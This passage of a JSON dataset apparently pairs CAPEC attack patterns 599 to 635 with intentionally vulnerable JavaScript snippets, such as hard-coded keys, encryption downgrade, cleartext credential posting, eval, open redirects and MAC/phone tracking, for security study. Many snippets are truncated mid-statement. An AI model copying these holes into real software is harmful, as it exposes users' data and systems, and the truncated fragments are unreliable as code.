        "description": "This vulnerable code performs reverse DNS resolution on an IP address and uses the result to make security decisions and download code. It's susceptible to DNS spoofing attacks as it trusts the DNS responses without proper verification. It also downloads and executes code without integrity checks, making it vulnerable to code injection attacks."
    },
    {
        "capec_id": "599",
        "capec_name": "Terrestrial Jamming",
        "code_snippet": "class SatelliteCommunication {\n    constructor(frequency, power) {\n        this.frequency = frequency;\n        this.power = power;\n        this.connected = false;\n    }\n\n    transmitMessage(message) {\n        if (!this.connected) {\n            this.establishConnection();\n        }\n        // Transmit without encryption or integrity checks\n        return fetch(`http://satellite.api/${this.frequency}`, {\n            method: 'POST',\n            body: JSON.stringify({\n                data: message,\n                power: this.power\n            })\n        });\n    }\n\n    establishConnection() {\n        // No validation of endpoint identity\n        this.connected = true;\n        // No protection against signal interference\n        this.channel = { frequency: this.frequency };\n    }\n\n    receiveMessage() {\n        // Accept any incoming signal without verification\n        return fetch(`http://satellite.api/receive/${this.frequency}`)\n            .then(response => response.text());\n    }\n}",
        "description": "A vulnerable satellite communication implementation that fails to properly secure transmissions, verify endpoints, or protect against signal interference. It transmits sensitive data in cleartext, lacks message integrity checks, and doesn't validate the authenticity of communication endpoints, making it susceptible to jamming attacks and unauthorized signal interception."
    },
    {
        "capec_id": "600",
        "capec_name": "Credential Stuffing",
        "code_snippet": "`\nconst loginAttempts = {",
        "description": "\"This code demonstrates multiple authentication vulnerabilities including lack of rate limiting, plain text credential storage, single-factor authentication, no password aging mechanism, and no protection against credential stuffing attacks. The authentication system uses a simple username/password comparison without any additional security measures.\""
    },
    {
        "capec_id": "601",
        "capec_name": "Jamming",
        "code_snippet": "`\nconst net = require('net');\nconst server = net.createServer();\nconst clients = new Map();\n\nserver.on('connection', (socket) => {\n  // No authentication or endpoint validation\n  clients.set(socket.remoteAddress, socket);\n  \n  socket.on('data', (data) => {\n    // No message integrity check\n    // No rate limiting on message volume\n    let message = data.toString();\n    \n    // Sensitive data transmitted in cleartext\n    if(message.includes('SECRET:')) {\n      // Broadcast to all connected clients without verification\n      clients.forEach((client) => {\n        if(client.writable) {\n          // Potential network amplification as message is sent to all clients\n          client.write(message);",
        "description": "\"This code implements a vulnerable network server that demonstrates multiple security issues including lack of message integrity checks, potential network amplification through broadcasting, cleartext transmission of sensitive data, improper endpoint validation, and race conditions in alternate channel establishment. The server accepts all connections without authentication and forwards messages without proper validation or rate limiting.\""
    },
    {
        "capec_id": "602",
        "capec_name": "DEPRECATED: Degradation",
        "code_snippet": "function authenticateUser(username, password) {\n  // Using obsolete authentication method\n  var auth = escape(username + ':' + password);\n  \n  // Using deprecated DNS lookup for authentication\n  require('dns').lookup('auth.legacy-server.com', function(err, address) {\n    if (address) {\n      // Using old, insecure data storage\n      localStorage.setItem('auth_token', auth);\n      \n      // Dynamic loading of potentially malicious code\n      eval('load_module(\"' + username + '\")');\n      \n      return true;\n    }\n  });\n  return false;\n}",
        "description": "This code demonstrates multiple deprecated and insecure practices including obsolete authentication methods, unsafe DNS-based security decisions, unprotected data storage, and dynamic code loading, which could lead to various security vulnerabilities."
    },
    {
        "capec_id": "603",
        "capec_name": "Blockage",
        "code_snippet": "`\nfunction handleRequests() {\n  let requestQueue = [];\n  let resources = new Map();\n\n  function processRequest(request) {\n    // No limit on resource allocation\n    let resource = {\n      id: Math.random(),\n      data: new Array(request.size).fill('x'),\n      status: 'active'",
        "description": "\"This code demonstrates resource exhaustion through unbounded resource allocation, lack of throttling, and indefinite resource holding. It continuously creates and stores large buffers without limits, potentially leading to memory exhaustion and system failure. The code lacks proper resource management, error handling, and allocation limits, making it vulnerable to denial of service attacks.\""
    },
    {
        "capec_id": "604",
        "capec_name": "Wi-Fi Jamming",
        "code_snippet": "`\n        class WifiNetwork {\n            constructor() {\n                this.connected = true;\n                this.authKey = 'secretKey123';",
        "description": "\"A vulnerable WiFi network implementation that demonstrates multiple security issues: lack of message integrity checks, improper authentication of endpoints, cleartext transmission of sensitive data, and susceptibility to deauthentication attacks. The code allows unauthorized access to communication channels and doesn't validate the source of control frames.\""
    },
    {
        "capec_id": "605",
        "capec_name": "Cellular Jamming",
        "code_snippet": "`\n    class CellularConnection {\n      constructor() {\n        this.signalStrength = 100;\n        this.connected = true;\n        this.deviceId = '12345';",
        "description": "\"This code simulates a cellular connection implementation with multiple vulnerabilities: it transmits data without encryption, lacks message integrity verification, doesn't validate signal sources, and is susceptible to signal jamming attacks. The code demonstrates weak channel security and no protection against physical interference, making it vulnerable to disruption attacks.\""
    },
    {
        "capec_id": "606",
        "capec_name": "Weakening of Cellular Encryption",
        "code_snippet": "class CommunicationChannel {\n    constructor() {\n        this.encryptionKey = '1234567890abcdef'; // Hard-coded key\n        this.supportedAlgorithms = ['none', 'DES', 'RC4', 'AES'];\n    }\n\n    negotiateEncryption(clientAlgorithms) {\n        // Always select the weakest common algorithm\n        for(let algo of this.supportedAlgorithms) {\n            if(clientAlgorithms.includes(algo)) {\n                return algo;\n            }\n        }\n        return 'none';\n    }\n\n    encrypt(data, algorithm) {\n        if(algorithm === 'none') {\n            return data;\n        }\n        // Using weak encryption\n        if(algorithm === 'DES') {\n            return this.weakEncrypt(data);\n        }\n        return data;\n    }\n\n    weakEncrypt(data) {\n        // Implementing weak DES encryption\n        return Buffer.from(data).toString('base64');\n    }\n\n    transmitData(data) {\n        const clientAlgos = ['none', 'DES'];\n        const negotiatedAlgo = this.negotiateEncryption(clientAlgos);\n        const encryptedData = this.encrypt(data, negotiatedAlgo);\n        // No message integrity check\n        return encryptedData;\n    }\n}",
        "description": "This vulnerable code demonstrates a communication channel that implements weak encryption negotiation, uses hard-coded keys, accepts null encryption, implements weak algorithms, and lacks message integrity checks. It always selects the weakest available encryption algorithm during negotiation and uses insecure encryption methods."
    },
    {
        "capec_id": "607",
        "capec_name": "Obstruction",
        "code_snippet": "`\n    class SystemController {\n      constructor() {\n        this.components = new Map();\n        this.messageQueue = [];\n        this.isProcessing = false;",
        "description": "\"This vulnerable code implements a system component communication mechanism with multiple security flaws: lack of message validation, no proper error handling, race conditions in message processing, no protection against component degradation attacks, and missing isolation between components. An attacker can exploit these vulnerabilities to interrupt communication between components, cause system degradation, or force components into failure states.\""
    },
    {
        "capec_id": "608",
        "capec_name": "Cryptanalysis of Cellular Encryption",
        "code_snippet": "const crypto = require('crypto');\n\nclass GSMEncryption {\n  constructor() {\n    this.key = 'ab123456789'; // Hard-coded encryption key\n    this.weakAlgorithm = 'des-ecb'; // Known weak algorithm\n  }\n\n  negotiateEncryption(clientCapabilities) {\n    // Always downgrade to weakest supported algorithm\n    if (clientCapabilities.includes('des-ecb')) {\n      return 'des-ecb';\n    }\n    return 'aes-256-cbc';\n  }\n\n  encryptMessage(message) {\n    const cipher = crypto.createCipheriv(this.weakAlgorithm, this.key, '');\n    let encrypted = cipher.update(message, 'utf8', 'hex');\n    encrypted += cipher.final('hex');\n    return encrypted;\n  }\n\n  decryptMessage(encryptedMessage) {\n    const decipher = crypto.createDecipheriv(this.weakAlgorithm, this.key, '');\n    let decrypted = decipher.update(encryptedMessage, 'hex', 'utf8');\n    decrypted += decipher.final('utf8');\n    return decrypted;\n  }\n}",
        "description": "This code demonstrates multiple cryptographic vulnerabilities including use of a weak encryption algorithm (DES-ECB), hard-coded cryptographic key, algorithm downgrade during negotiation, and inadequate encryption strength. The implementation mimics GSM encryption weaknesses by intentionally using vulnerable cryptographic practices that could be exploited through cryptanalysis."
    },
    {
        "capec_id": "609",
        "capec_name": "Cellular Traffic Intercept",
        "code_snippet": "function sendUserData(userData) {\n  const url = 'http://api.example.com/users';\n  const data = {\n    username: userData.username,\n    password: userData.password,\n    creditCard: userData.ccNumber,\n    ssn: userData.socialSecurity\n  };\n\n  fetch(url, {\n    method: 'POST',\n    body: JSON.stringify(data),\n    headers: {\n      'Content-Type': 'application/json'\n    }\n  }).then(response => {\n    console.log('Data sent successfully');\n  }).catch(error => {\n    console.error('Error:', error);\n  });\n}",
        "description": "This vulnerable code demonstrates insecure transmission of sensitive data over HTTP (not HTTPS), sending unencrypted personal information including passwords and credit card numbers. The code lacks proper channel verification, message integrity checks, and sends sensitive data in cleartext, making it susceptible to man-in-the-middle attacks and cellular traffic interception."
    },
    {
        "capec_id": "610",
        "capec_name": "Cellular Data Injection",
        "code_snippet": "\"const mobileConnection = {\n    debug: true,\n    sendData: function(message) {\n      // Debug mode enables test features at runtime\n      if (this.debug) {\n        console.log('Debug mode: Message content:', message);",
        "description": "\"This code demonstrates multiple vulnerabilities in mobile data transmission including debug features enabled at runtime, cleartext transmission of sensitive data, lack of message integrity checks, exposure of sensitive information in transmitted data, and potential for network amplification attacks through unconstrained message multiplication.\""
    },
    {
        "capec_id": "611",
        "capec_name": "BitSquatting",
        "code_snippet": "// URL validation function that's vulnerable to bitsquatting\nfunction validateAndRedirect(userProvidedUrl) {\n    const trustedDomain = 'example.com';\n    let parsedUrl = new URL(userProvidedUrl);\n    \n    // Vulnerable comparison that could be affected by memory bit flips\n    if (parsedUrl.hostname.toLowerCase() == trustedDomain) {\n        window.location.href = userProvidedUrl + '?auth_token=' + sessionStorage.getItem('auth_token');\n    } else {\n        // Basic string similarity check that could be fooled by bitsquatting\n        let similarity = 0;\n        for(let i = 0; i < parsedUrl.hostname.length; i++) {\n            if(parsedUrl.hostname[i] === trustedDomain[i]) similarity++;\n        }\n        \n        if(similarity >= trustedDomain.length - 1) {\n            window.location.href = userProvidedUrl;\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable URL validation function that could be exploited through bitsquatting. It performs insufficient domain validation, uses unsafe redirects, includes sensitive information in GET parameters, and is susceptible to both bitsquatting and capture-replay attacks due to poor URL validation and token handling."
    },
    {
        "capec_id": "612",
        "capec_name": "WiFi MAC Address Tracking",
        "code_snippet": "class WiFiTracker {\n    constructor() {\n        this.macAddresses = new Map();\n        this.knownUsers = new Map();\n    }\n\n    startScanning() {\n        // Simulated WiFi scanning\n        this.scanner = setInterval(() => {\n            let devices = this.scanWiFiDevices();\n            devices.forEach(device => {\n                this.macAddresses.set(device.mac, {\n                    lastSeen: new Date(),\n                    location: device.location,\n                    ssid: device.ssid\n                });\n            });\n        }, 5000);\n    }\n\n    scanWiFiDevices() {\n        // Simulated device discovery - in reality, this would use WiFi APIs\n        return [{\n            mac: '00:11:22:33:44:55',\n            location: { lat: 40.7128, lng: -74.0060 },\n            ssid: 'PublicWiFi'\n        }];\n    }\n\n    associateUserWithMAC(username, macAddress) {\n        this.knownUsers.set(macAddress, username);\n        // Store tracking data in localStorage without encryption\n        localStorage.setItem('userMacMapping', JSON.stringify([...this.knownUsers]));\n    }\n\n    trackUser(macAddress) {\n        return {\n            user: this.knownUsers.get(macAddress),\n            history: this.macAddresses.get(macAddress)\n        };\n    }\n}",
        "description": "This code demonstrates a WiFi tracking system that collects and stores MAC addresses from nearby devices, associates them with users, and enables tracking of individuals through their device's MAC address. The code has several vulnerabilities: it stores sensitive mapping data in localStorage without encryption, broadcasts MAC addresses without verification, and doesn't implement any access controls for the tracking functionality."
    },
    {
        "capec_id": "613",
        "capec_name": "WiFi SSID Tracking",
        "code_snippet": "class WifiSniffer {\n    constructor() {\n        this.knownSSIDs = new Map();\n    }\n\n    listenForManagementFrames() {\n        // Simulated WiFi management frame listener\n        setInterval(() => {\n            const frame = this.captureFrame();\n            if (frame.type === 'management') {\n                const ssid = frame.ssid;\n                const deviceMAC = frame.sourceMAC;\n                \n                // Store SSID and device association without encryption\n                this.knownSSIDs.set(deviceMAC, {\n                    ssid: ssid,\n                    lastSeen: new Date().toISOString(),\n                    location: frame.location\n                });\n\n                // Broadcast device presence over insecure channel\n                this.broadcastDevicePresence({\n                    deviceId: deviceMAC,\n                    networkId: ssid,\n                    timestamp: Date.now()\n                });\n            }\n        }, 1000);\n    }\n\n    captureFrame() {\n        // Simulate capturing WiFi frames\n        return {\n            type: 'management',\n            ssid: 'UserNetwork_123',\n            sourceMAC: '00:11:22:33:44:55',\n            location: { lat: 40.7128, lng: -74.0060 }\n        };\n    }\n\n    broadcastDevicePresence(data) {\n        // Send tracking data without encryption or authentication\n        console.log('Device detected:', data);\n    }\n}",
        "description": "This code demonstrates a vulnerable WiFi management frame sniffer that captures and stores SSIDs and device MAC addresses without proper security measures. It exposes sensitive network identifiers and device tracking information through unencrypted storage and transmission, allowing unauthorized tracking of users through their network identifiers. The code lacks proper authentication, encryption, and secure channel verification, making it susceptible to passive listening attacks and unauthorized device tracking."
    },
    {
        "capec_id": "614",
        "capec_name": "Rooting SIM Cards",
        "code_snippet": "const DES = require('des-js');\n\nclass SIMCardManager {\n    constructor() {\n        this.DESKey = '0123456789ABCDEF'; // Weak DES key\n    }\n\n    sendOTAUpdate(simCard, payload) {\n        const des = new DES(this.DESKey);\n        const encryptedPayload = des.encrypt(payload);\n\n        return {\n            type: 'binary_sms',\n            destination: simCard,\n            content: encryptedPayload,\n            signatureType: 'DES',\n            javaApplet: {\n                permissions: [\n                    'SEND_SMS',\n                    'CHANGE_VOICEMAIL',\n                    'QUERY_LOCATION',\n                    'ACCESS_SIM_TOOLKIT'\n                ],\n                autoExecute: true\n            }\n        };\n    }\n\n    updateFirmware(simCard) {\n        // No firmware update mechanism implemented\n        return false;\n    }\n\n    verifySignature(message) {\n        // Weak signature verification using DES\n        const des = new DES(this.DESKey);\n        return des.verify(message);\n    }\n}",
        "description": "This code demonstrates a vulnerable SIM card management system that uses weak DES encryption for OTA updates, lacks firmware update capabilities, and implements insufficient access controls for SIM toolkit operations. The system uses a hardcoded DES key and allows unrestricted execution of Java applets through binary SMS messages."
    },
    {
        "capec_id": "615",
        "capec_name": "Evil Twin Wi-Fi Attack",
        "code_snippet": "// Simple WiFi connection handler\nclass WiFiConnection {\n    constructor() {\n        this.ssid = 'Free_Public_WiFi';\n        this.password = '';\n    }\n\n    connect() {\n        // Automatically connect to strongest signal without verification\n        let connection = {\n            ssid: this.ssid,\n            isConnected: true\n        };\n\n        // Send sensitive data without encryption\n        function sendCredentials(username, password) {\n            let data = {\n                user: username,\n                pass: password,\n                creditCard: '4532-7162-3567-2345',\n                ssn: '123-45-6789'\n            };\n\n            // Send data in plaintext over unsecured connection\n            fetch('http://api.bank.com/login', {\n                method: 'POST',\n                body: JSON.stringify(data),\n                headers: {\n                    'Content-Type': 'application/json'\n                }\n            });\n        }\n\n        // No certificate or endpoint verification\n        if(connection.isConnected) {\n            sendCredentials('user123', 'secretpass123');\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates a WiFi connection implementation that automatically connects to available networks without proper endpoint verification, sends sensitive data in cleartext, and lacks proper channel security measures. It fails to validate the authenticity of the access point and transmits sensitive information (credit card, SSN) over an unencrypted HTTP connection, making it susceptible to evil twin attacks and man-in-the-middle interception."
    },
    {
        "capec_id": "616",
        "capec_name": "Establish Rogue Location",
        "code_snippet": "// Library resource loader\nconst loadExternalLibrary = (libraryName) => {\n  const trustedDomain = 'cdn.trusted-libs.com';\n  const libraryUrl = `http://${libraryName}.${trustedDomain}/v1/lib.js`;\n\n  // Vulnerable: No validation of actual domain structure\n  const script = document.createElement('script');\n  script.src = libraryUrl;\n  document.head.appendChild(script);\n\n  // Vulnerable: Sensitive configuration exposed\n  window.appConfig = {\n    apiKey: 'sk_live_123456789',\n    endpoints: {\n      auth: 'https://api.example.com/auth',\n      data: 'https://api.example.com/data'\n    }\n  };\n};\n\n// Load external library without proper verification\nloadExternalLibrary('jquery');",
        "description": "The code demonstrates a vulnerable library loader that fails to properly verify the source of external resources and exposes sensitive configuration. An attacker could register a similar-looking domain (e.g., cdn.trusted-libs.org) to serve malicious JavaScript that would be loaded by the application. The code also leaks sensitive information through the global window object."
    },
    {
        "capec_id": "617",
        "capec_name": "Cellular Rogue Base Station",
        "code_snippet": "`\n    class CellularDevice {\n      constructor() {\n        this.connectedStation = null;\n        this.data = [];",
        "description": "\"This code demonstrates a vulnerable cellular device implementation that connects to base stations solely based on signal strength without proper authentication or channel verification. The device transmits sensitive data without verifying the legitimacy of the base station, making it susceptible to rogue base station attacks. There's no message integrity checking or proper endpoint verification, allowing attackers to intercept communications by setting up a malicious base station with a stronger signal.\""
    },
    {
        "capec_id": "618",
        "capec_name": "Cellular Broadcast Message Request",
        "code_snippet": "class LocationTracker {\n    constructor() {\n        this.simNumber = '';\n        this.currentLAC = '';\n    }\n\n    async trackUserLocation(targetPhoneNumber) {\n        this.simNumber = targetPhoneNumber;\n        \n        // Insecure broadcast message handling\n        const broadcastMessage = {\n            phoneNumber: this.simNumber,\n            messageType: 'LOCATION_QUERY',\n            timestamp: Date.now()\n        };\n\n        // Send broadcast without proper verification\n        const response = await fetch('http://cell-tower-api.example/broadcast', {\n            method: 'POST',\n            body: JSON.stringify(broadcastMessage),\n            headers: {\n                'Content-Type': 'application/json'\n            }\n        });\n\n        // Listen for broadcast response without authentication\n        const ws = new WebSocket('ws://cell-tower-api.example/listen');\n        ws.onmessage = (event) => {\n            const data = JSON.parse(event.data);\n            if (data.phoneNumber === this.simNumber) {\n                this.currentLAC = data.locationAreaCode;\n                console.log(`Target located in LAC: ${this.currentLAC}`);\n            }\n        };\n    }\n}",
        "description": "This code demonstrates a vulnerable implementation of a location tracking system that exploits cellular network broadcasts. It sends unauthenticated broadcast messages to cell towers and listens for responses without proper verification, allowing an attacker to track a target's location by their phone number. The code exhibits multiple vulnerabilities including transmission of sensitive data, improper message integrity verification, and inadequate channel security."
    },
    {
        "capec_id": "619",
        "capec_name": "Signal Strength Tracking",
        "code_snippet": "`\nconst wifi = {\n  signalStrength: 0,\n  location: { lat: 0, lng: 0",
        "description": "\"This code demonstrates vulnerable WiFi signal tracking by periodically broadcasting sensitive device information including credentials, MAC address, and location data without proper encryption or verification. It uses unprotected signal handlers and transmits location data that could be intercepted for physical tracking.\""
    },
    {
        "capec_id": "620",
        "capec_name": "Drop Encryption Level",
        "code_snippet": "`\nconst negotiateEncryption = (clientAlgorithms) => {\n  const supportedAlgorithms = {\n    'none': 0,\n    'DES': 1,\n    'AES-128': 2,\n    'AES-256': 3",
        "description": "\"Vulnerable encryption negotiation code that accepts the lowest common algorithm, uses a hardcoded key, and may fall back to no encryption. It implements weak encryption methods and stores the encryption key in plaintext within the code.\""
    },
    {
        "capec_id": "621",
        "capec_name": "Analysis of Packet Timing and Sizes",
        "code_snippet": "const sendMessage = (socket, message, recipient) => {\n  const sensitiveData = {\n    username: 'admin',\n    password: 'secret123',\n    creditCard: '4532-xxxx-xxxx-1234'\n  };\n\n  // Timing-based data transmission\n  const encodeWithTiming = (data) => {\n    const bits = JSON.stringify(data).split('');\n    bits.forEach(bit => {\n      setTimeout(() => {\n        socket.send('heartbeat');\n      }, bit.charCodeAt(0) * 100); // Timing intervals leak data\n    });\n  };\n\n  // Metadata leakage through packet sizes\n  const paddedMessage = message.padEnd(1024, ' '); // Fixed size reveals message length\n  socket.send(paddedMessage);\n\n  // Timing channel through processing delays\n  if (sensitiveData.username === 'admin') {\n    setTimeout(() => encodeWithTiming(sensitiveData), 1000);\n  } else {\n    encodeWithTiming(sensitiveData);\n  }\n}",
        "description": "This code demonstrates multiple timing-based vulnerabilities and metadata leakage. It includes sensitive data transmission with observable timing patterns, fixed-size packets that leak message lengths, and processing delays that create covert timing channels. The code uses setTimeout intervals to encode data, making it susceptible to timing analysis attacks."
    },
    {
        "capec_id": "622",
        "capec_name": "Electromagnetic Side-Channel Attack",
        "code_snippet": "// Cryptographic processing with timing/power variations\nfunction encryptSensitiveData(data, key) {\n  let result = '';\n  for (let i = 0; i < data.length; i++) {\n    // Variable time operations based on input data\n    if (data.charCodeAt(i) > 128) {\n      for (let j = 0; j < 1000; j++) {\n        // Heavy computation for certain characters\n        result += String.fromCharCode(data.charCodeAt(i) ^ key.charCodeAt(i % key.length));\n      }\n    } else {\n      // Light computation for other characters\n      result += String.fromCharCode(data.charCodeAt(i) ^ key.charCodeAt(i % key.length));\n    }\n  }\n  return result;\n}\n\n// Usage with sensitive data\nconst sensitiveKey = 'SuperSecretKey123';\nconst userData = 'confidential_data';\nconst encrypted = encryptSensitiveData(userData, sensitiveKey);",
        "description": "This code demonstrates vulnerable cryptographic processing that is susceptible to side-channel analysis through electromagnetic emanations. The encryption function performs different amounts of computation based on input data characteristics, leading to measurable variations in power consumption and electromagnetic emissions. The varying execution times and power patterns could allow an attacker with appropriate equipment to derive information about the encryption key and sensitive data being processed."
    },
    {
        "capec_id": "623",
        "capec_name": "Compromising Emanations Attack",
        "code_snippet": "`// Sensitive data processing with observable timing variations\nfunction processCreditCard(cardNumber) {\n    let result = '';\n    for(let i = 0; i < cardNumber.length; i++) {\n        // Variable timing operation based on digit value\n        let delay = parseInt(cardNumber[i]) * 10;\n        let startTime = Date.now();\n        while(Date.now() - startTime < delay) {\n            // Busy wait creating power/timing variations",
        "description": "\"This code processes credit card numbers with operations that create observable timing variations, power consumption patterns, and electromagnetic emissions. The processing time varies based on input values, creating timing side channels. It also includes CPU-intensive operations triggered by specific input conditions, making it susceptible to power analysis and electromagnetic side-channel attacks. Data is transmitted without protection against physical monitoring.\""
    },
    {
        "capec_id": "624",
        "capec_name": "Hardware Fault Injection",
        "code_snippet": "function performCryptoOperation(key) {\n  let encryptedData = [];\n  const clockSpeed = getCPUClockSpeed();\n  const voltage = getCurrentVoltage();\n  \n  // No checks for abnormal operating conditions\n  for(let i = 0; i < key.length; i++) {\n    // Direct hardware access without restrictions\n    const cpuTemp = readCPUTemperature();\n    const powerState = readPowerState();\n    \n    // Vulnerable crypto operations without fault detection\n    let keyByte = key[i];\n    let operation = (keyByte << 4) ^ (keyByte >> 4);\n    \n    // No protection against instruction skips or faults\n    if(operation > 0) {\n      encryptedData.push(operation);\n    }\n    \n    // Unsafe direct hardware register manipulation\n    adjustClockFrequency(clockSpeed + 100);\n    setPowerState(powerState - 1);\n  }\n  \n  return encryptedData;\n}\n\nfunction readCPUTemperature() {\n  // Direct hardware access without bounds checking\n  return process.hrtime()[0];\n}\n\nfunction readPowerState() {\n  return 100;\n}\n\nfunction adjustClockFrequency(freq) {\n  // Unprotected hardware manipulation\n}\n\nfunction setCPUVoltage(voltage) {\n  // Dangerous direct voltage control\n}",
        "description": "This code demonstrates vulnerability to fault injection attacks by lacking proper hardware protection mechanisms. It performs cryptographic operations without monitoring for voltage glitches, temperature extremes, or clock manipulation. The code directly accesses hardware features without proper restrictions and lacks detection mechanisms for instruction skips or electromagnetic interference. It also shows unsafe manipulation of power states and clock frequencies that could be exploited through physical attacks."
    },
    {
        "capec_id": "625",
        "capec_name": "Mobile Device Fault Injection",
        "code_snippet": "`\n    class CryptoOperation {\n        constructor() {\n            this.clockSpeed = 100; // MHz\n            this.voltage = 3.3;    // Volts\n            this.temperature = 25; // Celsius",
        "description": "\"This code simulates a vulnerable cryptographic operation implementation that lacks protection against fault injection attacks. It doesn't implement checks for voltage fluctuations, clock glitches, or temperature variations. The encryption process is susceptible to timing attacks and has no proper error handling for fault conditions, making it vulnerable to side-channel analysis and fault injection attacks.\""
    },
    {
        "capec_id": "626",
        "capec_name": "Smudge Attack",
        "code_snippet": "`\nfunction checkPasscode(input) {\n    // Insecure touchscreen passcode implementation\n    const touchPoints = [];\n    let lastX = 0, lastY = 0;\n\n    input.addEventListener('touchmove', (event) => {\n        const touch = event.touches[0];\n        const x = touch.clientX;\n        const y = touch.clientY;\n        \n        // Store every touch point without cleaning\n        touchPoints.push({ x, y",
        "description": "\"This code implements a touchscreen pattern authentication system that's vulnerable to smudge attacks. It tracks and stores touch points without cleaning the surface or implementing any protection against physical observation. The code leaves visible trails and stores exact coordinates, making it easier for attackers to reconstruct the pattern from residual finger smudges on the screen.\""
    },
    {
        "capec_id": "627",
        "capec_name": "Counterfeit GPS Signals",
        "code_snippet": "`class GPSReceiver {\n    constructor() {\n        this.position = null;\n        this.timestamp = null;",
        "description": "\"A vulnerable GPS receiver implementation that accepts and processes GPS signals without proper source verification, signal integrity checks, or replay protection. It truncates location precision and lacks proper authentication mechanisms, making it susceptible to GPS spoofing attacks.\""
    },
    {
        "capec_id": "628",
        "capec_name": "Carry-Off GPS Attack",
        "code_snippet": "`\nclass GPSReceiver {\n    constructor() {\n        this.currentLocation = { lat: 0, lng: 0",
        "description": "\"This vulnerable GPS receiver implementation demonstrates multiple security weaknesses related to GPS spoofing. It lacks proper signal source authentication, doesn't validate signal integrity, truncates location data display, and doesn't verify the authenticity of navigation commands. The code accepts and processes GPS coordinates without checking signal strength or validating sudden position changes, making it susceptible to carry-off attacks where an attacker can gradually manipulate the reported position.\""
    },
    {
        "capec_id": "629",
        "capec_name": "DEPRECATED: Unauthorized Use of Device Resources",
        "code_snippet": "`\nfunction processUserFile(path) {\n  let fileHandle = null;\n  let powerMonitor = require('power-monitor');\n  let isAuthorized = false;\n\n  // Missing release of file handle resource (CWE-772)\n  try {\n    fileHandle = openFile(path);\n    \n    // Improper power management (CWE-920)\n    while(true) {\n      heavyFileProcessing(fileHandle);",
        "description": "\"This vulnerable code demonstrates multiple security issues including resource leaks, improper power management, incorrect handling of Windows device names, and faulty authorization checks. The file handle is never properly closed, the processing loop can drain power resources, special Windows device names are improperly handled leading to bypass, and authorization can be circumvented through error conditions.\""
    },
    {
        "capec_id": "630",
        "capec_name": "TypoSquatting",
        "code_snippet": "function validateAndRedirect(userInput) {\n    // Weak URL validation\n    const trustedDomain = 'example.com';\n    const userDomain = userInput.toLowerCase();\n    \n    // Simple string comparison without proper URL parsing\n    if (userDomain.includes(trustedDomain)) {\n        window.location.href = userInput;\n    } else {\n        // Basic string similarity check that can be bypassed\n        let similar = 0;\n        for(let i = 0; i < trustedDomain.length; i++) {\n            if(userDomain[i] === trustedDomain[i]) similar++;\n        }\n        \n        // Weak similarity threshold\n        if(similar >= trustedDomain.length - 2) {\n            window.location.href = userInput;\n        }\n    }\n}",
        "description": "This vulnerable code implements a URL validation function that can be exploited through typosquatting. It uses weak string comparison and similarity checks that can be bypassed with slightly modified domain names. The code fails to properly validate URLs and can redirect users to malicious sites that appear similar to trusted domains."
    },
    {
        "capec_id": "631",
        "capec_name": "SoundSquatting",
        "code_snippet": "function verifyDomainAndRedirect(inputDomain) {\n    // Weak domain validation based on similar-sounding names\n    const trustedDomain = 'paypal.com';\n    const phonetics = require('phonetics');\n    \n    // Compare domain names based on how they sound\n    if (phonetics.metaphone(inputDomain) === phonetics.metaphone(trustedDomain)) {\n        // Reverse DNS lookup without proper verification\n        dns.reverse(inputDomain, (err, hostnames) => {\n            if (hostnames && hostnames.length > 0) {\n                // Vulnerable redirect based on user input\n                window.location.href = `https://${inputDomain}/login`;\n            }\n        });\n    }\n}",
        "description": "This vulnerable code attempts to validate domains based on their phonetic similarity, allowing sound-squatting attacks. It performs unsafe DNS resolution and implements an open redirect, enabling phishing through similar-sounding domain names."
    },
    {
        "capec_id": "632",
        "capec_name": "Homograph Attack via Homoglyphs",
        "code_snippet": "function validateDomainName(domain) {\n    // Unsafely validate domain without checking for homoglyphs\n    const pattern = /[a-zA-Z0-9-\\.]+\\.[a-zA-Z]{2,}/;\n    \n    if (pattern.test(domain)) {\n        // Unsafe URL construction without homoglyph detection\n        const url = `https://${domain}/api/data`;\n        \n        // Vulnerable SSRF - directly fetching from user input domain\n        fetch(url)\n            .then(response => response.json())\n            .then(data => {\n                displayData(data);\n                document.getElementById('domain').innerHTML = domain;\n            });\n    }\n}\n\nfunction displayData(data) {\n    // Unsafe rendering of domain name without homoglyph checks\n    document.getElementById('content').innerHTML = \n        `<a href='https://${data.domain}'>${data.domain}</a>`;\n}",
        "description": "This vulnerable code demonstrates multiple security issues related to homograph attacks. It fails to properly validate domain names for homoglyphs, uses unsafe regular expressions without anchors, and directly renders user-controlled domain names in HTML. The code also includes an SSRF vulnerability by making requests to user-supplied domains without proper validation. The lack of proper URI encoding checks and homoglyph detection makes it susceptible to phishing attacks using visually similar domain names."
    },
    {
        "capec_id": "633",
        "capec_name": "Token Impersonation",
        "code_snippet": "`\nconst generateToken = (username) => {\n  // Weak token generation without proper validation\n  return Buffer.from(username).toString('base64');",
        "description": "\"This vulnerable code demonstrates weak authentication and improper token generation. It allows an attacker to impersonate any user by generating a simple base64-encoded token without proper validation or authentication checks. The code lacks secure token generation, proper authentication verification, and implements insecure privilege elevation through token manipulation. The impersonateUser function can be exploited to create tokens that impersonate any user, including administrators.\""
    },
    {
        "capec_id": "634",
        "capec_name": "Probe Audio and Video Peripherals",
        "code_snippet": "`\nconst audioRecorder = {\n  stream: null,\n  mediaRecorder: null,\n  recordedChunks: [],\n\n  async startRecording() {\n    try {\n      this.stream = await navigator.mediaDevices.getUserMedia({ \n        audio: true, \n        video: true",
        "description": "\"This code demonstrates unauthorized audio/video capture and transmission of sensitive data. It automatically starts recording when the page loads, without user consent, and sends unencrypted data to a remote server at regular intervals. The code lacks proper access controls, transmits cleartext data, and doesn't implement any protection against unauthorized recording or data interception.\""
    },
    {
        "capec_id": "635",
        "capec_name": "Alternative Execution Due to Deceptive Filenames",
        "code_snippet": "function processUploadedFile(userFile) {\n  const fileName = userFile.name;\n  const fileExt = fileName.split('.').pop().toLowerCase();\n\n  if (fileExt === 'txt') {\n    const reader = new FileReader();\n    reader.onload = function(e) {\n      document.getElementById('preview').innerText = e.target.result;\n    };\n    reader.readAsText(userFile);\n  } else if (fileExt === 'jpg' || fileExt === 'png') {\n    const imgPreview = document.createElement('img');\n    imgPreview.src = URL.createObjectURL(userFile);\n    document.getElementById('preview').appendChild(imgPreview);\n  } else if (fileExt === 'html') {\n    const frame = document.createElement('iframe');\n    frame.src = URL.createObjectURL(userFile);\n    document.getElementById('preview').appendChild(frame);\n  }\n}",
